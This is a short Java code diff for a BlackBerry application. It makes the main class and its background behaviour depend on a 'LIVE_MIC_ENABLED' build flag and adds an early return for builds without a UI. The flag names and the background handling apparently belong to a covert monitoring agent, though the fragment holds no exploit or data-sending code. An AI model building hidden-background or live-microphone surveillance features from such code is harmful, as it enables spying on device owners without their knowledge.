@@ -24,8 +24,12 @@ import blackberry.debug.DebugLevel;
  * The Class Main.
  * Antenna defines: DBC,HAVE_PERMISSIONS,HAVE_MIME,EVENTLOGGER
  */
-public class Main extends UiApplication {
 
+//#ifdef LIVE_MIC_ENABLED
+public class Main extends UiApplication {
+//#else
+public class Main extends Application {
+//#endif
     /**
      * The main method.
      * 
@@ -97,11 +101,25 @@ public class Main extends UiApplication {
     }
 
     public void goBackground() {
+        if(!Conf.IS_UI){
+            //#ifdef DEBUG_WARN
+            debug.warn("Not UI");
+            //#endif
+        
+            return;
+        }
+    
         invokeLater(new Runnable() {
-            public void run() {
+            public void run() {         
+                
+                boolean foreground = false;
+                //#ifdef LIVE_MIC_ENABLED
                 UiApplication.getUiApplication().requestBackground();
+                foreground = UiApplication.getUiApplication().isForeground();
+                //#endif
+                
                 //#ifdef DEBUG_TRACE
-                debug.trace("Main foreground: " + UiApplication.getUiApplication().isForeground());
+                debug.trace("Main foreground: " + foreground);
                 //#endif
             }
         });
